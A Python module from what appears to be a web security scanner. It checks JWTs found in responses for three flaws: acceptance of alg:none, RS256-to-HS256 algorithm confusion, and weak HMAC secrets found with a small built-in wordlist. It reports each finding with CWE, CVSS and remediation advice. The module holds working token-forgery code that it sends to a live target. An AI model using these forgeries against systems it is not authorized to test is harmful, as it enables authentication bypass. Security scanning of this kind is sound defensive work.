"""
modules/jwt_analysis.py
Analyzes any JWT observed in responses/cookies for: alg:none acceptance,
alg-confusion (RS256 -> HS256 using the public key as an HMAC secret), and
weak/guessable HMAC secrets via a small built-in wordlist.
"""
from __future__ import annotations

import base64
import hmac
import hashlib
import json
import re

from core.config import ScanConfig
from core.cvss import score_profile
from core.http_client import HttpClient
from core.schema import Confidence, Evidence, Finding, Severity

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*")

WEAK_SECRETS = [
    "secret", "password", "123456", "changeme", "jwtsecret", "your-256-bit-secret",
    "supersecret", "secretkey", "admin", "test", "key", "jwt_secret", "s3cr3t",
]


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _find_jwts(resp) -> list[str]:
    found = set(JWT_RE.findall(resp.text))
    for hval in resp.headers.values():
        found.update(JWT_RE.findall(str(hval)))
    return list(found)


def _sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
    msg = f"{header_b64}.{payload_b64}".encode()
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return base64.urlsafe_b64encode(sig).rstrip(b"=").decode()


def run(client: HttpClient, config: ScanConfig, baseline_hook=None) -> list[Finding]:
    findings: list[Finding] = []
    resp = client.get(config.target)
    if baseline_hook:
        baseline_hook(config.target, resp.elapsed_ms, len(resp.text), resp.status_code)

    tokens = _find_jwts(resp)
    for token in tokens[:5]:
        parts = token.split(".")
        if len(parts) != 3:
            continue
        try:
            header = json.loads(_b64url_decode(parts[0]))
        except Exception:
            continue

        alg = header.get("alg", "")
        header_b64, payload_b64, sig_b64 = parts

        # --- alg:none check --------------------------------------------------
        none_header = base64.urlsafe_b64encode(json.dumps({**header, "alg": "none"}).encode()).rstrip(b"=").decode()
        forged_none = f"{none_header}.{payload_b64}."
        test_resp = client.get(config.target, headers={"Authorization": f"Bearer {forged_none}"})
        accepted_none = test_resp.status_code in (200, 201, 204) and test_resp.status_code != resp.status_code or (
            test_resp.status_code == 200 and resp.status_code in (401, 403)
        )
        if accepted_none:
            vector, score = score_profile("jwt_alg_none")
            findings.append(Finding(
                vulnerability_type="jwt_alg_none",
                title="JWT 'alg:none' accepted by server",
                endpoint=config.target,
                parameter="Authorization",
                root_cause="jwt_alg_none_accepted",
                module="jwt_analysis",
                severity=Severity.CRITICAL,
                confidence=Confidence.HIGH,
                description="A forged JWT with alg set to 'none' and no signature was accepted by the server as valid.",
                remediation="Explicitly reject 'none' and any unexpected algorithm in JWT verification; pin the expected algorithm.",
                cwe="CWE-347",
                owasp="API2:2023-Broken Authentication",
                cvss_vector=vector,
                cvss_score=score,
                likelihood="high",
                evidence=Evidence(
                    request_summary=test_resp.request_summary,
                    response_summary=test_resp.response_summary,
                    signal_1="forged_alg_none_token_accepted",
                ),
            ))

        # --- weak HMAC secret brute-force (only if alg is HS*) ---------------
        if alg.startswith("HS"):
            for secret in WEAK_SECRETS:
                expected_sig = _sign_hs256(header_b64, payload_b64, secret)
                if hmac.compare_digest(expected_sig, sig_b64):
                    vector, score = score_profile("jwt_weak_secret")
                    findings.append(Finding(
                        vulnerability_type="jwt_weak_secret",
                        title="JWT signed with a weak/guessable HMAC secret",
                        endpoint=config.target,
                        parameter="Authorization",
                        root_cause="jwt_weak_secret_wordlist_match",
                        module="jwt_analysis",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.CONFIRMED,
                        description=f"The token's HMAC signature was successfully reproduced using a common weak secret from a built-in wordlist ({len(WEAK_SECRETS)} entries tested).",
                        remediation="Rotate the signing secret to a high-entropy random value (32+ bytes) and never reuse it across environments.",
                        cwe="CWE-326",
                        owasp="API2:2023-Broken Authentication",
                        cvss_vector=vector,
                        cvss_score=score,
                        likelihood="high",
                        evidence=Evidence(
                            request_summary=f"Offline HMAC verification against captured token",
                            response_summary="Signature matched using wordlist secret (secret redacted)",
                            signal_1="hmac_signature_reproduced",
                            signal_2="wordlist_match_deterministic",
                        ),
                    ))
                    break

        # --- alg confusion (RS256 -> HS256 using public key as secret) ------
        if alg == "RS256" and config.identities:
            pubkey = next((i.get("public_key") for i in config.identities if i.get("public_key")), None)
            if pubkey:
                confusion_header = base64.urlsafe_b64encode(json.dumps({**header, "alg": "HS256"}).encode()).rstrip(b"=").decode()
                forged_sig = _sign_hs256(confusion_header, payload_b64, pubkey)
                forged_token = f"{confusion_header}.{payload_b64}.{forged_sig}"
                test_resp2 = client.get(config.target, headers={"Authorization": f"Bearer {forged_token}"})
                if test_resp2.status_code in (200, 201, 204):
                    vector, score = score_profile("jwt_alg_none")
                    findings.append(Finding(
                        vulnerability_type="jwt_alg_confusion",
                        title="JWT algorithm-confusion (RS256->HS256) accepted",
                        endpoint=config.target,
                        parameter="Authorization",
                        root_cause="jwt_alg_confusion_accepted",
                        module="jwt_analysis",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.HIGH,
                        description="A token re-signed as HS256 using the RSA public key as the HMAC secret was accepted by the server.",
                        remediation="Enforce a single expected algorithm per key type at verification time; never accept an algorithm the client can choose.",
                        cwe="CWE-347",
                        owasp="API2:2023-Broken Authentication",
                        cvss_vector=vector,
                        cvss_score=score,
                        likelihood="medium",
                        evidence=Evidence(
                            request_summary=test_resp2.request_summary,
                            response_summary=test_resp2.response_summary,
                            signal_1="alg_confusion_token_accepted",
                        ),
                    ))

    return findings
